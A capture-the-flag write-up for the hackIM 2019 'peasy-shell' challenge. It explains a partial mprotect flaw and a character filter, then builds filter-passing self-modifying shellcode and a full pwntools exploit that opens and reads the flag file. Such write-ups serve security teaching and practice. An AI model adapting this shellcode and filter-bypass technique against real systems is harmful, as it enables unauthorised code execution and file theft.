# hackIM peasy-shell

This writeup is based off of: https://lordidiot.github.io/2019-02-03/nullcon-hackim-ctf-2019/#peasy-shell

This challenge is a sequel to easy-shell, which you can find a writeup for here: https://github.com/guyinatuxedo/ctf/tree/master/hackIM19/pwn/easyshell

### What's different?

Looking at the binary, it looks pretty similar to the previous challenge easy-shell. We can see that the character and `execve` seccomp restrictions that were in the previous challenge are still present. However we can see that there is a difference in the `main` function, with the function `make_rx` being called right before our shellcode is executed:

```
    make_rx(buf);
    ((void (__fastcall *)(void *, void *))buf)(buf, buf);
```

When we check the permissions of the memory where our input (`15935728`) is stored after the `make_rx` function is called, we see that it is `rx`:

```
Breakpoint 1, 0x000055ab3f4cbe43 in ?? ()
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In (0x7fa9e2457000-0x7fa9e2458000), permission=r-x
  0x7fa9e2457000 - 0x7fa9e2457008  →   "15935728[...]" 
```

Let's take a look at the `make_rx` function:

```
int __fastcall make_rx(void *inputPtr)
{
  int result; // eax@1

  result = mprotect(inputPtr, 1uLL, 5);
  if ( result < 0 )
  {
    put("mprotect failed: rx");
    exit(-1);
  }
  return result;
}
```

So we can see that the `mprotect` function assigns the permission `5` (which is for `read` and `execute`) to the region of memory where our input is. However we see that the size that it assigns this permission is `1`, so it shouldn't change the permissions of the entire chunk. 

before the `make_rx` call:
```
0x00007f74ba01e000 0x00007f74ba022000 0x0000000000000000 rwx 
```

after the `make_rx` call:
```
0x00007f74ba01e000 0x00007f74ba01f000 0x0000000000000000 r-x 
0x00007f74ba01f000 0x00007f74ba022000 0x0000000000000000 rwx 
```

So we can see that it only assigned the permissions `rx` to the first `0x1000` bytes (it rounded up to `0x1000` since that is the default normal page size). What we could do in theory is write the opcode `0x1000` bytes after the start of our input, however then our shellcode would be too big (as a result of all of the NOPS) and it wouldn't read our shellcode properly (due to the fact that our data would be chunked together into smaller chunks, which the `read` call wouldn't take into account). However we can see that there is another difference, with that it appends a return instruction (`0xc3` opcode) to the end of our shellcode:

```
    *((_BYTE *)buf + bytesRead) = 0xC3u;
```

This helps tremendously, since if we can write the address past the `0x1000` bytes of `rx`, then push the address of the syscall onto the stack and then return to it, we will be able to run the shellcode. In addition to that, we can see that the character restriction has changed:

```
      if ( !((*__ctype_b_loc())[*((_BYTE *)buf + bytesRead)] & 0x400)
        && !((*__ctype_b_loc())[*((_BYTE *)buf + bytesRead)] & 0x800) )
      {
        put("Epic Fail!");
        exit(-1);
      }
```

We see here that it says that the value loaded has to be not equal to 0 when anded by both `0x400` and `0x800`, however when we check the assembly code, we see that it really can be one or the other (so that `&&` should be a `||`). Taking a look at the region of memory it draws from, we see this:

```
gef➤  x/40g $rax
0x7f66d0d58cc0 <_nl_C_LC_CTYPE_class+256>:	0x0002000200020002	0x0002000200020002
0x7f66d0d58cd0 <_nl_C_LC_CTYPE_class+272>:	0x2002200220030002	0x0002000220022002
0x7f66d0d58ce0 <_nl_C_LC_CTYPE_class+288>:	0x0002000200020002	0x0002000200020002
0x7f66d0d58cf0 <_nl_C_LC_CTYPE_class+304>:	0x0002000200020002	0x0002000200020002
0x7f66d0d58d00 <_nl_C_LC_CTYPE_class+320>:	0xc004c004c0046001	0xc004c004c004c004
0x7f66d0d58d10 <_nl_C_LC_CTYPE_class+336>:	0xc004c004c004c004	0xc004c004c004c004
0x7f66d0d58d20 <_nl_C_LC_CTYPE_class+352>:	0xd808d808d808d808	0xd808d808d808d808
0x7f66d0d58d30 <_nl_C_LC_CTYPE_class+368>:	0xc004c004d808d808	0xc004c004c004c004
0x7f66d0d58d40 <_nl_C_LC_CTYPE_class+384>:	0xd508d508d508c004	0xc508d508d508d508
0x7f66d0d58d50 <_nl_C_LC_CTYPE_class+400>:	0xc508c508c508c508	0xc508c508c508c508
0x7f66d0d58d60 <_nl_C_LC_CTYPE_class+416>:	0xc508c508c508c508	0xc508c508c508c508
0x7f66d0d58d70 <_nl_C_LC_CTYPE_class+432>:	0xc004c508c508c508	0xc004c004c004c004
0x7f66d0d58d80 <_nl_C_LC_CTYPE_class+448>:	0xd608d608d608c004	0xc608d608d608d608
0x7f66d0d58d90 <_nl_C_LC_CTYPE_class+464>:	0xc608c608c608c608	0xc608c608c608c608
0x7f66d0d58da0 <_nl_C_LC_CTYPE_class+480>:	0xc608c608c608c608	0xc608c608c608c608
0x7f66d0d58db0 <_nl_C_LC_CTYPE_class+496>:	0xc004c608c608c608	0x0002c004c004c004
0x7f66d0d58dc0 <_nl_C_LC_CTYPE_class+512>:	0x0000000000000000	0x0000000000000000
0x7f66d0d58dd0 <_nl_C_LC_CTYPE_class+528>:	0x0000000000000000	0x0000000000000000
0x7f66d0d58de0 <_nl_C_LC_CTYPE_class+544>:	0x0000000000000000	0x0000000000000000
0x7f66d0d58df0 <_nl_C_LC_CTYPE_class+560>:	0x0000000000000000	0x0000000000000000
```

I figured out what characters we have access to using the same method I did for the easy shell challenge (checking by hand). Doing that, I figured out that we have access to the corresponding characters to the following integers (if I made a mistake, I'm sorry, it's 4:20 AM an I'm tired):
```
48 - 55
58 - 59
65 - 71
72 - 87
89 - 91
97 - 99
100 - 119
121 - 123
124 - 127
```
### Crafting Shellcode

Just as a quick reference, here is the state of the registers when our shellcode is ran with the input `15935728` being the shellcode.

```
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007fb3fc31cae7  →  <mprotect+7> cmp rax, 0xfffffffffffff001
$rdx   : 0x00007fb3fc815000  →  0x3832373533393531 ("15935728"?)
$rsp   : 0x00007ffc00a29360  →  0x00007ffc00a29478  →  0x00007ffc00a2b3da  →  "./challenge"
$rbp   : 0x00007ffc00a29390  →  0x000055a8098cee60  →   push r15
$rsi   : 0x1               
$rdi   : 0x00007fb3fc815000  →  0x3832373533393531 ("15935728"?)
$rip   : 0x000055a8098cee4c  →   call rdx
$r8    : 0x00007fb3fc5ee8c0  →  0x0000000000000000
$r9    : 0x00007fb3fc801500  →  0x00007fb3fc801500  →  [loop detected]
$r10   : 0x22              
$r11   : 0x202             
$r12   : 0x000055a8098ce940  →   xor ebp, ebp
$r13   : 0x00007ffc00a29470  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
```

Starting off, we will want to write the opcodes for a syscall `\x05\x0f`. The first step of this will be to get a pointer to the memory past the `0x1000` mark (where the permission is `rwx`). What we can do is push the `rdx` register (which holds a pointer to the start of our input) seven times onto the stack, then move the value of `rsp` into the `rcx` register via push/pop. Then we can use the `xor dword ptr[rcx + 0x30], eax` to write to the first value we pushed on to the stack, which would be a pointer to the start of our input. The value we will be xoring by is `0x1000` (which we will need to xor the `eax` register twice in order to set it to that). This is not only because it will get us past the `rx` section, however in binary form it is comprised of only one `1` bit, with the rest being zeroes. Hopefully the corresponding bit in the address for the start of our input will be `0`, that way it get's set to `1` and the address gets increased by `0x1000`. If it is set to `1` then the address will get decremented by `0x1000`. So we have roughly a 50/50 chance of this working:

```
; Push the 7 eight byte pointers onto the stack
push rdx
push rdx
push rdx
push rdx
push rdx
push rdx
push rdx

; Pop / Push the stack pointer into the rcx register
push rsp
pop rcx

; 0x0 ^ 0x30307730 = 0x30307730
; 0x30307730 ^ 0x30306730 = 0x1000
xor eax, 0x30307730
xor eax, 0x30306730

; Since we can only input alphanumeric characters, 0x30 is the smallest offset we can set, thus the need for 7 `push rdx`s
xor dword ptr[rcx + 0x30], eax

; Pop the modified pointer into the rcx register, after popping off the 6 "filler" qwords first
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
```

With that we will have a pointer to the `rwx` spot in memory in the `rcx` register (assuming the 50/50 bit thing goes our way). Next we can write the two byte syscall opcode `\x05\x0f` using the `xor dword ptr[rcx + 0x30], eax` instruction. First we will clear out the `eax` register by xoring it by the same values, then xoring it by two new values that will give is a value that starts off with `0x050f`. In addition to that, we will also write the values `0x5e5f` after the `0x050f` (so the total four bytes are `0x050f5e5f`), which are the opcodes for `pop rdi` and `pop rsi`. We need those two instructions there to setup the syscall, and the character restriction prevents us from including those instructions with our input:

```
; 0x1000 ^ 0x30307730 = 0x30306730
; 0x30306730 ^ 0x30306730 = 0x0
xor eax, 0x30307730
xor eax, 0x30306730

; 0x0 ^ 0x30363030 = 0x30363030 
; 0x30363030 ^ 0x35396e6f = 0x50f5e5f
xor eax, 0x30363030
xor eax, 0x35396e6f

; write the syscall opcodes
xor dword ptr [rcx + 0x30], eax
```

After that, we have just two steps left. We will need to increment the pointer to the `rwx` memory region (the pointer in the `rcx` register) by `0x30`. Then after that just prep the registers, push rcx, and return to execute the syscall. Now for incrementing the pointer, we will do it the same way we originally incremented it by `0x1000`:

```
; First push the qword pointer we will be writing, and the 6 "filler" qwords
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx

; push/pop the value of rsp into the rcx register
push rsp
pop rcx

; 0x50f5e5f ^ 0x30363030 = 0x35396e6f
; 0x35396e6f ^ 0x35396e6f = 0x0
xor eax, 0x30363030
xor eax, 0x35396e6f

; 0 ^ 0x30303059 = 0x30303059
; 0x30303059 ^ 0x30303069 = 0x30
xor eax, 0x30303059
xor eax, 0x30303069

; Do the write, and hope it increments instead of decrementing
xor dword ptr[rcx + 0x30], eax

; pop the "filler" qwords off, then the written pointer into the rcx register
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
```

The last part of the shellcode will be to just prep the registers for the sycall. These are the value/register pairs that we will need:
```
rax:	0x0:	specify read syscall
rdi:	0x0:	specify reading in with stdin
rsi:	ptr to rwx region:	specifies where we want to write to
rdx:	0x202:	specifies how much we will write (this value is conveniently in the r11 register)
```

We will setup the `rax` and `rdx` registers here, and let the opcodes we wrote handle the `rdi` and `rsi` registers. In addition to that, we will need to push the rcx register on last, that way the return instruction will return to the syscall (in addition to the two values for the `rdi` and `rsi` registers):

```
; Move the size value into the rdx register
push r11
pop rdx

; Move the value 0x0 into the rax register to specify read
push rbx
pop rax

; Push the address of the instruction twice, with the integer 0x0 in between. One of the addresses is used for the return instruction,
; The other is for the rsi register for the syscall, and the 0x0 is to specify stdin with the rdi register for the syscall
push rcx
push rbx
push rcx
```

and of course, we have the instructions that we wrote earlier with the shellcode:

```
pop rdi
pop rsi
syscall
```

Putting it all togther, we get the following shellcode:
```
; Push the 7 eight byte pointers onto the stack
push rdx
push rdx
push rdx
push rdx
push rdx
push rdx
push rdx

; Pop / Push the stack pointer into the rcx register
push rsp
pop rcx

; 0x0 ^ 0x30307730 = 0x30307730
; 0x30307730 ^ 0x30306730 = 0x1000
xor eax, 0x30307730
xor eax, 0x30306730

; Since we can only input alphanumeric characters, 0x30 is the smallest offset we can set, thus the need for 7 `push rdx`s
xor dword ptr[rcx + 0x30], eax

; Pop the modified pointer into the rcx register, after popping off the 6 "filler" qwords first
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx

; 0x1000 ^ 0x30307730 = 0x30306730
; 0x30306730 ^ 0x30306730 = 0x0
xor eax, 0x30307730
xor eax, 0x30306730

; 0x0 ^ 0x30363030 = 0x30363030 
; 0x30363030 ^ 0x35396e6f = 0x50f5e5f
xor eax, 0x30363030
xor eax, 0x35396e6f

; write the syscall opcodes
xor dword ptr [rcx + 0x30], eax

; First push the qword pointer we will be writing, and the 6 "filler" qwords
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx

; push/pop the value of rsp into the rcx register
push rsp
pop rcx

; 0x50f5e5f ^ 0x30363030 = 0x35396e6f
; 0x35396e6f ^ 0x35396e6f = 0x0
xor eax, 0x30363030
xor eax, 0x35396e6f

; 0 ^ 0x30303059 = 0x30303059
; 0x30303059 ^ 0x30303069 = 0x30
xor eax, 0x30303059
xor eax, 0x30303069

; Do the write, and hope it increments instead of decrementing
xor dword ptr[rcx + 0x30], eax

; pop the "filler" qwords off, then the written pointer into the rcx register
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx

; Move the size value into the rdx register
push r11
pop rdx

; Move the value 0x0 into the rax register to specify read
push rbx
pop rax

; Push the address of the instruction twice, with the integer 0x0 in between. One of the addresses is used for the return instruction,
; The other is for the rsi register for the syscall, and the 0x0 is to specify stdin with the rdi register for the syscall
push rcx
push rbx
push rcx
```

For the second shellcode pair of shellcode, I just reused the same shellcode I used for easy-shell. Putting it all together, we get the following exploit:

```
# This exploit is based off of: https://lordidiot.github.io/2019-02-03/nullcon-hackim-ctf-2019/#peasy-shell

from pwn import *

target = process('./challenge')
#gdb.attach(target, gdbscript='entry-break')

context.arch = "amd64"

# Check the writeup for a detailed explanation of this shellcode
sc0 = asm("""

push rdx
push rdx
push rdx
push rdx
push rdx
push rdx
push rdx

push rsp
pop rcx

xor eax, 0x30307730
xor eax, 0x30306730

xor dword ptr[rcx + 0x30], eax

pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx

xor eax, 0x30307730
xor eax, 0x30306730

xor eax, 0x30363030
xor eax, 0x35396e6f

xor dword ptr [rcx + 0x30], eax

push rcx
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx

push rsp
pop rcx

xor eax, 0x30363030
xor eax, 0x35396e6f

xor eax, 0x30303059
xor eax, 0x30303069

xor dword ptr[rcx + 0x30], eax

pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx

push r11
pop rdx

push rbx
pop rax

push rcx
push rbx
push rcx
""")



target.send(sc0)

# checkout https://github.com/guyinatuxedo/ctf/tree/master/hackIM19/pwn/easyshell for a detailed explanation of this shellcode
sc1 = asm("""
sub rsp, 0x1000
mov rsi, rsp
xor rdi, rdi
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
mov rax, 1
syscall
""")

target.send("0"*4 + sc1)

target.send("flag\x00")

target.interactive()

```
